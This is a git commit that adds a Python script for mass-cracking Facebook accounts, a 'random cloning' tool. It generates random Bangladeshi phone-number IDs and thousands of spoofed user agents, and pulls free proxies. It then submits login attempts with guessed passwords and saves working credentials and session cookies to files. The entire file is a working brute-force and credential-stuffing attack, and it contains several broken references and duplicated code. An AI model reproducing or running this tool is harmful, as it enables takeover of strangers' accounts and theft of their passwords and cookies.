6778155a591141f450d74bbcabde16edc8e18d8f
bipul159 <115370450+bipul159@users.noreply.github.com>
2023-09-24 04:33:10 +0600

    Add files via upload

---
+++ rifat.py
@@ -0,0 +1,402 @@
+#---------------------[IMPORT]---------------------#
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+import os,sys,time,json,random,re,string,platform,base64,platform,uuid
+import requests,random,sys,json,os,re
+from time import sleep
+from os import system
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
+import marshal
+import zlib
+import base64
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+from random import random as acak
+from random import choice as pilih
+from random import randint
+from bs4 import BeautifulSoup
+import requests as ress
+from sys import exit as exit
+
+###----------[ IMPORT LIBRARY ]---------- ###
+import requests
+import bs4
+import sys
+import os
+import random
+import time
+import re
+import json
+import uuid
+import subprocess
+import marshal
+import rich
+import shutil
+import webbrowser
+from random import randint
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from bs4 import BeautifulSoup as par
+from datetime import date
+from datetime import datetime
+# from rich import print as printer
+from datetime import date
+import marshal
+try:
+    import requests
+except ImportError:
+    print('\n [×] Please Wait Requests Module Installing......!\n')
+    os.system('pip install requests')
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [×] Please Wait Futures Module Installing......!\n')
+    os.system('pip install futures')
+try:
+    import bs4
+except ImportError:
+    print('\n [×] Please Wait bs4 Module Installing......!\n')
+    os.system('pip install bs4')
+try:
+    import rich
+except ImportError:
+    print('\n [×] Please Wait Rich Module Installing......!\n')
+    os.system('pip install rich')
+    os.system('python Rndm.py')
+from bs4 import BeautifulSoup
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+#---color---#
+G='\033[38;5;46m'
+R='\033[38;5;196m'
+Y='\33[1;33m'
+W='\033[1;37m'
+B='\033[1;34m'
+P='\033[38;5;203m'
+X='\033[38;5;208m'
+T='\033[100m'
+C='\033[1;33m'
+E='\033[m'
+S='\033[38;5;47m'
+asu = random.choice([G,R,B,Y,P,S,E,X,W])
+A = '\x1b[1;97m' 
+#B = '\x1b[1;96m' 
+C = '\x1b[1;91m' 
+D = '\x1b[1;92m'
+M = '{RED}'
+H = '{GREEN}'
+N = '\x1b[1;37m'    
+E = '\x1b[1;93m' 
+F = '\x1b[1;94m'
+#G = '\x1b[1;95m'
+GREEN ='\x1b[38;5;46m'
+RED = '\x1b[38;5;196m'
+WHITE = '\033[1;97m'
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+BLACK="\033[1;30m"
+R = '{RED}' # PUTIH
+#G = '{GREEN}' # PUTIH
+Y = '\033[1;33m' # PUTIH
+Q = '\033[1;37m'
+T = '\033[1;34m'
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+import random
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+twf =[]
+user=[]
+ugen=[]
+for nt in range(10000):
+    rr=random.randint
+    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    rx=random.randrange(1, 999)
+    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}.1.0; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
+    ugen.append(xx)
+
+loop = 0
+cp = []
+ok = []
+twf = []
+
+ugen = []
+for xd in range(5000):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+try:
+    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+    open('.prox.txt','w').write(prox)
+except Exception as e:
+    print(' WELCOME TO RANDOM CLONING SYSTEM')
+    
+prox=open('.prox.txt','r').read().splitlines()
+
+
+for xd in range(10000):
+    a='Mozilla/5.0 (Symbian/3; Series60/'
+    b=random.randrange(1, 9)
+    c=random.randrange(1, 9)
+    d='Nokia'
+    e=random.randrange(100, 9999)
+    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+    g=random.randrange(1, 9)
+    h=random.randrange(1, 4)
+    i=random.randrange(1, 4)
+    j=random.randrange(1, 4)
+    k='Mobile Safari/535.1'
+    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+    ugen.append(uaku)
+
+
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+for x in range(10):
+    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
+    b=random.randrange(100, 9999)
+    c=random.randrange(100, 9999)
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    h=random.randrange(1, 9)
+    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
+    j=random.randrange(1, 9)
+    k=random.randrange(1, 9)
+    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
+    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
+def uaku():
+    try:
+        ua=open('bbnew.txt','r').read().splitlines()
+        for ub in ua:
+            ugen.append(ub)
+    except:
+        a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
+        ua=open('.bbnew.txt','w')
+        aa=re.findall('line">(.*?)<',str(a))
+        for un in aa:
+            ua.write(un+'\n') 
+        ua=open('.bbnew.txt','r').read().splitlines()
+
+loop = 0
+cp = []
+ok = []
+twf = []
+
+def clear():
+    os.system('clear')
+    print(logo)
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+
+logo =(f"""
+  \33[1;32m   ____  ___    ____ _    ________    __
+   \33[1;33m / __ \/   |  / __ \ |  / / ____/   / /
+ \33[1;31m  / /_/ / /| | / /_/ / | / / __/ __  / / 
+  \33[1;34m/ ____/ ___ |/ _, _/| |/ / /___/ /_/ /  
+\33[1;32m /_/   /_/  |_/_/ |_| |___/_____/\____/  {asu}R U M I 
+{asu}----------------------------------------------
+{W}[{G}√{W}] Author    :{asu} PARVEJ
+{W}[{G}√{W}] Facebook  :{G} FH Roman
+{W}[{G}√{W}] Github    :{G} PARVEJ-143
+{W}[{G}√{W}] Tool Name :{G} RANDOM
+{W}[{G}√{W}] Tool type :{G} TRAIL
+{asu}----------------------------------------------
+ 
+{asu}----------------------------------------------""")
+clear()
+xxxx = str(len(ugen))
+print(f"{W}[{G}√{W}]{G} TODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+print(f'{asu}----------------------------------------------') 
+print(f"{W}[{G}√{W}]{G} TOTAL USER AGENTS \033[1;91m: \033[1;96m" + xxxx)
+print(f'{asu}----------------------------------------------') 
+print (f'{W}[{G}√{W}]{G} INTRODUCTION ')
+print(f'{asu}----------------------------------------------') 
+NameX =input(f'{W}[{G}√{W}]{G} WHAT IS YOUR NAME \033[1;91m: \033[1;96m')
+
+PARVEJ="PARVEJ-UiD-"
+myid=uuid.uuid4().hex[:10].upper()
+try:
+	key1 = open('/data/data/com.termux/files/usr/bin/.rv-cov', 'r').read()
+except:
+	kok=open('/data/data/com.termux/files/usr/bin/.rv-cov', 'w')
+	kok.write(myid+PARVEJ)
+	kok.close()
+
+
+#---------------------[MAIN MENU]---------------------#
+def main():
+    clear()
+    os.getuid
+    os.system("clear");print(logo)
+    clear()
+    print (f'{W}[{G}√{W}]{G} MAIN MENU ')
+    print(f'{asu}----------------------------------------------') 
+    print(f"{W}[{G}√{W}]{G} TODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f'{asu}----------------------------------------------') 
+    print(f"{W}[{G}√{W}]{G} USERNAME : {NameX}")
+    print(f'{asu}----------------------------------------------') 
+    print(f"{W}[{G}01{W}]{G} RANDOM CLONE ")
+    print(f"{W}[{G}00{W}]{G} EXIT ")
+    print(f'{asu}----------------------------------------------') 
+    adi = input(f"{W}[{G}√{W}]{G} SELECT OPTION : \033[1;36m")
+    if adi in ["1","01"]:
+        pass1()
+    elif adi in ["0","00"]:
+       exit()
+    else:
+        print('\033[1;31mINCORECT OPTION!\3[1;31m')
+        main()
+
+
+def pass1():
+    os.system("clear")
+    print(logo)
+    clear()
+    print(f"{W}[{G}√{W}]{G} TODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f'{asu}----------------------------------------------') 
+    print(f"{W}[{G}√{W}]{G} S I M N E T W O R K C O D E M E N U ")
+    print(f'{asu}----------------------------------------------') 
+    print(f"{W}[{G}√{W}]{G} EXAMPLE ")
+    print(f'{asu}----------------------------------------------') 
+    print(f'{W}[{G}√{W}]{G} BD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
+    print(f'{asu}----------------------------------------------') 
+    code = input(f'{W}[{G}√{W}]{G} PUT SIM NETWORK CODE : \033[1;36m')
+    os.system("clear")
+    print(logo)
+    print(f"{W}[{G}√{W}]{G} TODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f'{asu}----------------------------------------------') 
+    print(f"{W}[{G}√{W}]{G} I D S L I M I T M E N U ")
+    print(f'{asu}----------------------------------------------') 
+    limit = int(input(f'{W}[{G}√{W}]{G} EXAMPLE : \033[1;96m2000, 3000, 50000, 100000\n{asu}----------------------------------------------\n{W}[{G}√{W}]{G} PUT IDS LIMIT \033[1;91m: \033[1;96m'))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as manshera:    
+        clear()
+        tl = str(len(user))
+        print(f"{W}[{G}√{W}]{G} TODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print(f'{asu}----------------------------------------------') 
+        print(f"{W}[{G}√{W}]{G} USER NAME\033[1;91m                :\033[1;96m "+NameX)
+        print(f"{W}[{G}√{W}]{G} SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
+        print(f"{W}[{G}√{W}]{G} TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
+        print(f'{W}[{G}√{W}]{G} PASSWORD METHOD\033[1;91m          : \033[1;96m1') 
+        print(f'{asu}----------------------------------------------') 
+        print(f'{W}[{G}√{W}]{G} PLEASE WAIT YOUR CLONING HAS BEEN STARTED')
+        print(f'{asu}----------------------------------------------') 
+        for love in user:
+            uid = code+love
+            pwx = [love,]#'Bangladesh','bangladesh','bangla','Bangla','i love you','free fire','@#@#@#','@@@###','jannat','sadiya','203040','405060','708090','102030','304050','nusrat','mimmim','fatema','farjana','soniya','tamanna','mababa','shathi','habiba','robiul','parvej','samiya','lamiya','sultana','304050','jumana','labiba','yeasin','alamin','rahman']
+            manshera.submit(freeq,uid,pwx,tl)
+    print('')
+    print(f'{asu}----------------------------------------------') 
+    print(f'{W}[{G}√{W}]{G} CLONING COMPLETED\n{W}[{G}√{W}]{G} YOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+f'\n{W}[{G}√{W}]{G} TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print(f'{asu}----------------------------------------------') 
+    print(f'{W}[{G}√{W}]{G} OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n{W}[{G}√{W}]{G} CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
+    input(f'{W}[{G}√{W}]{G} PRESS ENTER TO BACK MENU');os.system("clear");main()
+
+def freeq(uid,pwx,tl):
+    global loop
+    global ok
+    global cp
+    global ugen
+    try:
+        for ps in pwx:
+            bi = random.choice([A])
+            session = requests.Session()
+            fhr = random.choice(ugen)
+            free_fb = session.get('https://m.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority':'mobile.facebook.com',
+            'upgrade-insecure-requests': '1',
+            'viewport-width': '809',
+            'method': 'GET',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-US,en;q=0.9', 
+            'dnt':'1', 
+            'x-requested-with':'mark.via.gp', 
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'document',
+            'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"',
+            "sec-ch-prefers-color-scheme": "light",
+            'user-agent': fhr}
+            lo = session.post('https://mobile.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb,proxies=proxs).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('\033[1;92m[PARVEJ-OK] '+uid+' | '+ps+'\n\033[92;1m[\033[91;1m●\033[92;1m] COOKIE : '+coki+'\033[0;97m')
+                open('ok.txt', 'a').write(uid+' | '+ps+'\n')
+                cek_apk(session,coki)
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('\033[1;97m[PARVEJ-CP] '+uid+' | '+ps+' | '+fhr+'\033[0;97m')
+                open('cp.txt', 'a').write(uid+' | '+ps+'\n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write('\r\033[1;97m[\033[1;92mR-CRACK\033[1;97m] [\033[1;93m%s\033[1;97m/\033[1;94m%s\033[1;97m] \033[1;92mOK\033[1;97m=[\033[1;92m%s\033[1;97m] \033[1;91mCP\033[1;97m=[\033[1;91m%s\033[1;97m]\r'%(loop,tl,len(oks),len(cps))),
+        sys.stdout.flush()
+    except:
+        pass
+
+main()
